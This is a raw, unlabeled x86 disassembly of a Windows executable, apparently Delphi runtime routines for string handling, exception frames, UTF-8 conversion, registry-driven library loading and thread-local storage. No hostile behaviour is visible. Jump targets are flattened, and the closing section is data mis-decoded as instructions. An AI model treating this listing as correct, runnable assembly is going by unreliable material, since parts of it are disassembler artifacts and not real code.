je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404ae8
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4055b0
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404f28
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c04
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403fb0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404678
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404ad0
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c04
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404ae8
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4055b0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404f28
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404d00
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404d54
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404d4c
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c40
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_4049d8
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c40
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404d34
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404d54
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404eec
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_4049d8
sub_404f28
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404eec
pop edx
pop eax
sub_404f50
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404f80
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_4051bc
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404fc8
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404f80
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405004
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_404ff0
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_404ff0
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_404ff0
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4051bc
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4052c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405004
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40545c
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_4054bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4054f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405528
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40558c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4054bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405593
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4055b0
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4055dc
test edx edx
je sub_405598
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405680
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4056a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405784
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4058bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40595b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f5c
mov eax ebx
xor edx edx
call sub_4047b4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405962
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
call sub_4047a8
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045a8
mov eax ebx
call sub_4047a8
push eax
mov eax [ ebp - 0x4 ]
call sub_40421c
inc eax
push eax
mov eax ebx
call sub_404798
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
pop ecx
pop edx
call sub_4056a8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f5c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045a8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fb0
sub_405968
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4059ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40463c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a06
lea eax [ ebp - 0x4 ]
call sub_40463c
retn
mov eax ebx
call sub_40421c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404884
mov eax ebx
call sub_40421c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047a8
inc eax
push eax
mov eax ebx
call sub_40441c
push eax
mov eax [ ebp - 0x4 ]
call sub_404798
pop ecx
pop edx
call sub_405784
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40463c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404884
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404678
sub_405a0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404788
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4058bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a56
lea eax [ ebp - 0x4 ]
call sub_40463c
retn
sub_405a5c
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404154
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404fc8
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_40404c
jmp r-xdata
sub_405ab4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405b1a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4041cc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c60
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b21
lea eax [ ebp - 0x10 ]
call sub_403f5c
retn
xor ebx ebx
sub_405b28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405b72
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b79
retn
mov eax rw-data
call sub_402ad8
mov eax rw-data
call sub_402ad8
mov eax rw-data
call sub_402ad8
call sub_401ac0
sub_405b7c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404cf8
call sub_40306c
test al al
je r-xdata
call sub_403160
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_40309c
call sub_40127c
call sub_405ab4
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_405ab4
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405c84
push ebx
call sub_405c7c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405c70
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f50
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f50
sub_405cc8
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405c84
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405d14
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405c50
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405d08
mov edx rw-data
mov eax ebx
call sub_403ca4
pop ebx
retn
sub_405d58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d84
retn
sub_405db4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405dd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405df5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405dfc
retn
sub_405e08
or al 0x5e
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
or [ esi + 0x40 ] bl
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
arpl [ esi ] ax
mov eax eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc esi
add [ ebx + 0x1c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
adc al 0x63
inc esi
add [ ebx + 0x1025ffc0 ] cl
arpl [ esi ] ax
mov eax eax
jmp [ __import_lookup_table_6(kernel32:EnumCalendarInfoA) ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc esi
add [ ebx + 0x825ffc0 ] cl
arpl [ esi ] ax
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x2425ffc0 ] cl
arpl [ esi ] ax
mov eax eax
jmp [ CreateEventA@IAT ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
